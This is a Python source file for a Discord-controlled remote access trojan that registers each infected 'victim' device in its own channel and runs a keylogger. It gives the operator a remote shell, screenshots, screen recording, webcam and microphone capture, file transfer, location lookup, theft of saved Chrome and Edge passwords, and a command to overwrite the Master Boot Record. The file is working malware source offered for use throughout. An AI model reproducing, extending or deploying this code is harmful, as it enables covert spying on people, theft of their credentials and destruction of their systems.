#snitch.py
import asyncio, sys

if sys.platform == "win32" and sys.version_info >= (3, 8):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

import discord
from discord.ext import commands
import os, signal, subprocess
from initiator import BOT_TOKEN, device_id
from distortion import *

GUILD_ID = "YOUR_DISCORD_SERVER_ID"
ALL_VICTIMS_HERE = "CATEGORY_ID" # category id under dedicated channels for victim\s device is supposed to be created
CONTROL_CENTER = "MAIN_CHANNEL_ID" # This channel will be used by the initiator when a victim comes online
victim_channel = None
keylogger_manager = None

intents = discord.Intents.default()
intents.message_content = True  # THIS is key to reading messages content
intents.messages = True 

# The command_prefix is required, but you don't have to use it.
client = commands.Bot(command_prefix="$", intents=intents)

shell_active_channels = {}
voice_sessions = {}

help_menu = """
List of all slash commands:

`Starts a keylogger when snitch is up and running. All the key captures along with process window for context shall be dumped when session is terminated or killed.

/help: Shows up this menu.
/shell: Starts a command prompt session. Type 'exit' to quit.
/audio_stream: Connects to a voice channel and starts streaming audio.
/screenshot: Sends a screenshot of victim's screen.
/screen_record <duration> <fps>: Records victim's screen for specified duration and fps. 
-Note: Keep the duration and fps low for successfull captures.
/image: Captures an image from victim's webcam.
/info: Sends the IP address and location of the victim's device.
/press <key>: Triggers mentioned <key> on victim's machine.
/upload_to_victim: Uploads a file onto victim's device.
/upload: Uploads any file from victim's device.
/passwords: Dumps all the passwords saved in google chrome and Microsoft Edge.
/alert: Sends a custom alert to victim's device.
/c4charge: Overwrites Master Boot Record.
/self_destruct: Distortion is completely wiped off the victim's device.`
"""

parent_pid = None
# Check if a command-line argument (the PID) was passed
if len(sys.argv) > 1:
    try:
        parent_pid = int(sys.argv[1])
        print(f"Parent process (distortion.py) PID: {parent_pid}")
    except ValueError:
        print("Warning: Could not parse parent PID.")

async def send_notification(process_name, victimchannel):
    # We need to make sure the client is ready and the channel is available
    await client.wait_until_ready()
    channel = client.get_channel(int(victimchannel)) # Assumes victim_channel is globally set
    print(victimchannel)
    if channel:
        embed = discord.Embed(
            title="⚠️ Social Media Detected",
            description=f"Victim has opened an application with a window titled:\n`{process_name}`",
            color=discord.Color.orange()
        )
        await channel.send(embed=embed)

async def send_hq_alert(device):
    await client.wait_until_ready()
    hq_channel = client.get_channel(int(CONTROL_CENTER))
    if hq_channel:
        await hq_channel.send(f"<@{YOUR_USERID}> We got a new prey, {device} in the system!")
    else:
        print("[Discord] HQ channel not found!")

def writeChannelId(channelId):
    with open("channel.txt", "w") as f:
        f.write(str(channelId))

def newUser():
    try:
        with open("channel.txt", 'r') as f:
            channel_id = f.read().strip()
            if channel_id == "":
                return True, None
            return False, channel_id
    except FileNotFoundError:
        return True, None


async def checkin():
    global victim_channel, keylogger_manager
    new_user = newUser()

    guild = client.get_guild(GUILD_ID)  
    category = discord.utils.get(guild.categories, id=ALL_VICTIMS_HERE)
    if guild is None:
        return {"error": "Guild not found"}

    # Create new channel for the device
    if new_user[0]:

        channel = await guild.create_text_channel(
            name=f"victim-{device_id}",
            category=category,
            reason="New target connected"
        )

        print(f"[Discord] Created channel {channel.name} ({channel.id}) for device {device_id}")

        asyncio.create_task(send_hq_alert(device_id))
        victim_channel = channel.id
        writeChannelId(victim_channel)
        print("Check in for new victim successful")
    
    else:
        channel_id = new_user[1]
        victim_channel = channel_id
        await client.wait_until_ready()
        victim_channel_obj = client.get_channel(int(channel_id))
        if victim_channel_obj:
            await victim_channel_obj.send(f"<@{763769606669991977}> {device_id} is currently active!")
            print("Checkin for old victim successful")

    # Create the manager instance, passing our notification function as the callback
    #comment the keylogger part. we dont need distortion to capture keys while testing.
    keylogger_manager = KeyloggerManager(
    # The lambda now accepts two arguments (p for process, c for channel)
    # that your distortion.py code is sending it.
            notification_callback=lambda p, c: asyncio.run_coroutine_threadsafe(
                send_notification(p, c), client.loop
            ),
            # Pass the victim's channel ID when you create the object.
            victimChannel=victim_channel 
        )
    keylogger_manager.start()

@client.tree.command(name="press", description="Simulates a key press on the victim's machine.")
@discord.app_commands.describe(
    keys="The key or combination to press. Examples: 'enter', 'ctrl+c', 'alt+f4', 'a'."
)
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def press(interaction: discord.Interaction, keys: str):
    """Triggers the key press on the victim's machine."""
    # Deferring is good practice, though this command is usually very fast.
    await interaction.response.defer(thinking=True)
    
    try:
        # Call the function from our distortion library
        result = press_key_combination(keys)
        
        # Send the result back to Discord
        await interaction.followup.send(f"✅ Executor response: `{result}`")
        
    except Exception as e:
        await interaction.followup.send(f"❌ An unexpected error occurred: {e}")


@client.tree.command(name="upload_to_victim", description="Uploads a file to the victim's machine.")
@discord.app_commands.describe(
    attachment="The file you want to upload.",
    path="The full path (including filename) to save the file on the victim's machine."
)
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def upload_to_victim(interaction: discord.Interaction, attachment: discord.Attachment, path: str):
    """
    Receives a file attached to the command and instructs the victim to download it.
    """
    await interaction.response.defer(thinking=True)

    try:
        # The attachment object contains a direct URL to the file hosted on Discord's CDN.
        file_url = attachment.url
        
        loop = asyncio.get_running_loop()
        
        # Use run_in_executor to run our blocking download function in a separate thread.
        # This prevents it from freezing the bot.
        # The 'None' argument tells it to use the default thread pool executor.
        success, message = await loop.run_in_executor(
            None, download_file, file_url, path
        )
        
        if success:
            await interaction.followup.send(f"✅ **Upload successful:** `{message}`")
        else:
            await interaction.followup.send(f"❌ **Upload failed:** `{message}`")

    except Exception as e:
        await interaction.followup.send(f"❌ An unexpected error occurred: {e}")


@client.tree.command(name="upload", description="Uploads any file from the victim's machine.")
@discord.app_commands.describe(path="The full local path to the file you want to upload.")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def upload(interaction: discord.Interaction, path: str):
    """
    Uploads a specified file from the victim's machine to the Discord channel.
    """
    if interaction.channel.id == int(victim_channel):
        await interaction.response.defer(thinking=True)

        # 1. Check if the file exists.
        if not os.path.exists(path):
            await interaction.followup.send(f"❌ **Error:** File not found at `{path}`")
            return

        # 2. Check the file size before attempting to upload.
        try:
            file_size_mb = os.path.getsize(path) / (1024 * 1024)
            if file_size_mb > 25:
                await interaction.followup.send(f"❌ **Upload Failed:** The file is {file_size_mb:.2f} MB, which is larger than the 25MB limit.")
                return
        except Exception as e:
            await interaction.followup.send(f"❌ Could not get file size: {e}")
            return
        
        # 3. Create the discord.File object and send it.
        try:
            await interaction.followup.send(
                f"✅ **Uploading file:** `{os.path.basename(path)}`",
                file=discord.File(path)
            )
        except Exception as e:
            await interaction.followup.send(f"❌ An unexpected error occurred during upload: {e}")

@client.tree.command(name="info", description="Gets Ip and location of the victim")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def info(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        result = ipAndLoc()
        await interaction.response.send_message(result)

@client.tree.command(name="image", description="Gets the image from victim's webcam")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def image(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        path = get_image()
        await interaction.response.defer(thinking=True)
        if path:

            if not os.path.exists(path):
                await interaction.followup.send(f"❌ **Error:** Couldnt send screenshot!")
                return

            try:
                # Define a standard filename for the attachment.
                attachment_filename = "image.png"

                # 1. Create a discord.File object with the specified filename.
                discord_file = discord.File(path, filename=attachment_filename)

                # 2. Create the embed object.
                embed = discord.Embed(
                    title="Image Viewer",
                    description=f"Screenshot from the victim's device`",
                    color=discord.Color.blue()
                )

                # 3. Set the embed's image URL to use the attachment.
                #    The filename here MUST match the filename in discord.File().
                embed.set_image(url=f"attachment://{attachment_filename}")

                # 4. Send the message with BOTH the file and the embed.
                await interaction.followup.send(file=discord_file, embed=embed)

            except Exception as e:
                await interaction.followup.send(f"❌ An unexpected error occurred while sending the file: {e}")

        else:
            await interaction.followup.send(f"❌ An unexpected error occurred while sending the file")

@client.tree.command(name="screenshot", description="Gets the screenshot from victim's device")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def screenshot(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        path = get_screenshot()
        await interaction.response.defer(thinking=True)
        if path:

            if not os.path.exists(path):
                await interaction.followup.send(f"❌ **Error:** Couldnt send screenshot!")
                return

            try:
                # Define a standard filename for the attachment.
                attachment_filename = "image.png"

                # 1. Create a discord.File object with the specified filename.
                discord_file = discord.File(path, filename=attachment_filename)

                # 2. Create the embed object.
                embed = discord.Embed(
                    title="Image Viewer",
                    description=f"Screenshot from the victim's device`",
                    color=discord.Color.blue()
                )

                # 3. Set the embed's image URL to use the attachment.
                #    The filename here MUST match the filename in discord.File().
                embed.set_image(url=f"attachment://{attachment_filename}")

                # 4. Send the message with BOTH the file and the embed.
                await interaction.followup.send(file=discord_file, embed=embed)

            except Exception as e:
                await interaction.followup.send(f"❌ An unexpected error occurred while sending the file: {e}")
        else:
            await interaction.followup.send(f"❌ An unexpected error occurred while sending the file")

@client.tree.command(name="passwords", description="Dumps saved login credentials from Chrome and Edge.")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def passwords(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel) and interaction.user.id == 763769606669991977:
        await interaction.response.defer(thinking=True)
    
        try:
            # Call the function from our distortion library
            creds = get_browser_passwords()
            
            if not creds:
                await interaction.followup.send("No passwords found or supported browsers are not installed.")
                return

            # Format the credentials into a string and save to a temporary file.
            file_path = "credentials.txt"
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(json.dumps(creds, indent=4))
            
            # Send the file to the Discord channel.
            await interaction.followup.send("✅ Found credentials! Uploading file...", file=discord.File(file_path))
            
            # Clean up the file from the victim's machine.
            os.remove(file_path)

        except Exception as e:
            await interaction.followup.send(f"❌ An error occurred while stealing passwords: {e}")

    else:
        await interaction.response.send_message("Nice try!")

@client.tree.command(name="screen_record", description="Records the victim's screen for a set duration.")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
@discord.app_commands.describe(
    duration="The recording duration in seconds (e.g., 10). Keep it short!",
    fps="Frames per second for the recording (e.g., 15). Lower FPS = smaller file."
)
async def screen_record(interaction: discord.Interaction, duration: int = 10, fps: int = 15):
    # Defer the response immediately, this will definitely take time.
    await interaction.response.defer(thinking=True)
    
    # Add a warning for the user about file size
    if duration * fps > 300: # Roughly > 20 seconds at 15fps
        await interaction.followup.send("⚠️ **Warning:** Long durations or high FPS may result in a file too large to upload (Discord limit is 25MB).")

    file_path = None
    try:
        # Call the recording function from our distortion library
        file_path = record_screen(duration_seconds=duration, fps=fps)
        
        if file_path and os.path.exists(file_path):
            # Check file size before attempting to upload
            if os.path.getsize(file_path) > 25 * 1024 * 1024: # 25MB limit
                 await interaction.followup.send(f"❌ **Upload Failed:** The recorded video is larger than 25MB.")
                 return # We still clean up the file in the `finally` block
            
            # When you send a video file, Discord creates the embed automatically.
            await interaction.followup.send(
                "✅ **Screen Recording Complete**",
                file=discord.File(file_path)
            )
        else:
            await interaction.followup.send("❌ Failed to create the recording file.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ An unexpected error occurred: {e}")

    finally:
        # Always clean up the video file from the victim's machine
        if file_path and os.path.exists(file_path):
            try:
                os.remove(file_path)
                print(f"Cleaned up temporary video file: {file_path}")
            except Exception as e:
                print(f"Error during file cleanup: {e}")

@client.tree.command(name="alert", description="Shows an alert on victim's device")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def alert(interaction: discord.Interaction, title: str, message: str):
    if interaction.channel.id == int(victim_channel):
        await interaction.response.defer(thinking=True)
        result = show_alert(title, message)
        if result:
            await interaction.followup.send("Alert Sent")
        else:
            await interaction.followup.send("There was an error in sending alert")

@client.tree.command(name="help", description="Displays help menu")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def help(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        await interaction.response.send_message(help_menu)

@client.tree.command(name="audio_stream", description="streams audio from victim's device")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def audio_stream(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        guild_id = interaction.guild.id
        
        # --- Stop the stream if it's already running ---
        if guild_id in voice_sessions:
            vc, streamer = voice_sessions[guild_id]
            streamer.stop()
            await vc.disconnect()
            del voice_sessions[guild_id]
            await interaction.response.send_message("✅ Microphone stream stopped.")
            return

        # --- Start the stream ---
        # Check if the attacker is in a voice channel
        if not interaction.user.voice:
            await interaction.response.send_message("❌ You need to be in a voice channel to start the stream.")
            return

        # Defer the response as connecting can take time
        await interaction.response.defer(thinking=True)

        try:
            # Connect to the attacker's voice channel
            voice_channel = interaction.user.voice.channel
            vc = await voice_channel.connect()
        except Exception as e:
            await interaction.followup.send(f"❌ Failed to connect to voice channel: {e}")
            return

        # Create a new streamer instance for this session
        streamer = AudioStreamer()
        # Start the microphone capture and get the audio source object
        audio_source = streamer.start()

        # Store the session objects
        voice_sessions[guild_id] = (vc, streamer)

        player = discord.PCMVolumeTransformer(audio_source, volume=1.0)

        # A more detailed error callback for debugging
        def after_playing(error):
            if error:
                print(f'Player error: {error}')
            else:
                print("Player finished.")

        # Start streaming the audio to the voice channel
        vc.play(player, after=after_playing)

        await interaction.followup.send("🟢 Live microphone stream started. You should be able to hear audio.")
        
@client.tree.command(name="shell", description="access command prompt")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def shell(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        shell_manager = ShellManager()
        if interaction.channel.id in shell_active_channels:
        # If shell is active, stop it.
            response = shell_manager.stop_shell()
            del shell_active_channels[interaction.channel.id]

        else:
            # If shell is not active, start it.
            response = shell_manager.start_shell()
            shell_active_channels[interaction.channel.id] = shell_manager
        
    await interaction.response.send_message(f"```\n{response}\n```")


@client.tree.command(name="terminate", description="terminates current session")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def terminate(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        await interaction.response.send_message("Session terminated 💀")
        
        if interaction.channel.id in shell_active_channels:
            shell_active_channels[interaction.channel.id].stop_shell()
            del shell_active_channels[interaction.channel.id]

        log_data_json = keylogger_manager.stopAndDump()
    
        # 2. Save the dump to a file and send it
        temp_log_path = os.path.join(os.getenv("TEMP"), "keylog_dump.json")
        with open(temp_log_path, "w", encoding="utf-8") as f:
            f.write(log_data_json)
        
        await interaction.followup.send(
            "☠️ **Agent Terminated.** Final keylogger dump attached.",
            file=discord.File(temp_log_path)
        )
        os.remove(temp_log_path)

        await client.close()
        subprocess.run(["python", "initiator.py"])

@client.tree.command(name="self_destruct", description="Deletes distortion from the victim's machine and terminates.")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def self_destruct(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        """
        Triggers the self-destruct sequence.
        """
        await interaction.response.defer(thinking=True)

        log_data_json = keylogger_manager.stopAndDump()
    
        # 2. Save the dump to a file and send it
        temp_log_path = os.path.join(os.getenv("TEMP"), "keylog_dump.json")
        with open(temp_log_path, "w", encoding="utf-8") as f:
            f.write(log_data_json)
        
        await interaction.followup.send(
            f"🔥 **Self-destruct sequence initiated.** Keylogger dump below. This will be the final response from `{device_id}`",
            file=discord.File(temp_log_path)
        )
        os.remove(temp_log_path)
        
        try:
            # Call the self-destruct function from our distortion library
            self_destructor()
        except Exception as e:
            # This part is just for logging on your end if something goes wrong.
            # We can't send a followup message because the bot will be closing.
            print(f"Error during self-destruct setup: {e}")

        # Finally, close the bot connection. This unlocks the files for deletion.
        await client.close()

@client.tree.command(name="c4charge", description="Overwrites Master Boot Record")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def c4charge(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        result = implant_c4Charge()
        if result:
            interaction.response.send_message("Master Boot Record successfully overwritten!")
        else:
            interaction.response.send_message("Failed overwriting Master Boot Record")

@client.tree.command(name="kill", description="kills distortion. Has to be restarted by the victim")
@discord.app_commands.guilds(discord.Object(id=GUILD_ID))
async def kill(interaction: discord.Interaction):
    if interaction.channel.id == int(victim_channel):
        await interaction.response.send_message("Kill switch pressed 💀")

        if interaction.channel.id in shell_active_channels:
            shell_active_channels[interaction.channel.id].stop_shell()
            del shell_active_channels[interaction.channel.id]
        
        log_data_json = keylogger_manager.stopAndDump()
    
        # 2. Save the dump to a file and send it
        temp_log_path = os.path.join(os.getenv("TEMP"), "keylog_dump.json")
        with open(temp_log_path, "w", encoding="utf-8") as f:
            f.write(log_data_json)
        
        await interaction.followup.send(
            "☠️ **Agent Terminated.** Final keylogger dump attached.",
            file=discord.File(temp_log_path)
        )
        os.remove(temp_log_path)
        
        if parent_pid:
            try:
                # Use os.kill to send a termination signal
                os.kill(parent_pid, signal.SIGTERM) 
                print(f"Termination signal sent to parent process {parent_pid}")
            except OSError as e:
                # This might happen if the parent is already dead
                print(f"Could not kill parent process {parent_pid}: {e}")

        # Then, cleanly shut down the current bot (snitch.py)
        await client.close()

@client.event
async def on_message(message: discord.Message):
    """Handles messages for the shell."""
    if message.author == client.user:
        return

    # --- Stop the stream if it's already running ---
    if GUILD_ID in voice_sessions and message.content.lower().strip() == 'exit':
        vc, streamer = voice_sessions[GUILD_ID]
        streamer.stop()
        await vc.disconnect()
        del voice_sessions[GUILD_ID]
        await message.channel.send("✅ Microphone stream stopped.")
        return
    
    channel_id = message.channel.id
    if channel_id in shell_active_channels:
        command = message.content
        
        # --- Handle 'exit' command ---
        if command.lower().strip() == 'exit':
            response = shell_active_channels[channel_id].stop_shell()
            del shell_active_channels[channel_id]
            await message.channel.send(f"```\n{response}\n```")
            return

        # --- Send command to the shell manager ---
        output = shell_active_channels[channel_id].run_command(command)
        
        await message.channel.send(f"```\n{output}\n```")

@client.event
async def on_ready():
    print(f"Discord bot logged in as {client.user}")
    try:
        synced = await client.tree.sync(guild=discord.Object(id=GUILD_ID))
        print(f"Synced {len(synced)} command(s) to the guild.")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

    await checkin()

client.run(BOT_TOKEN)

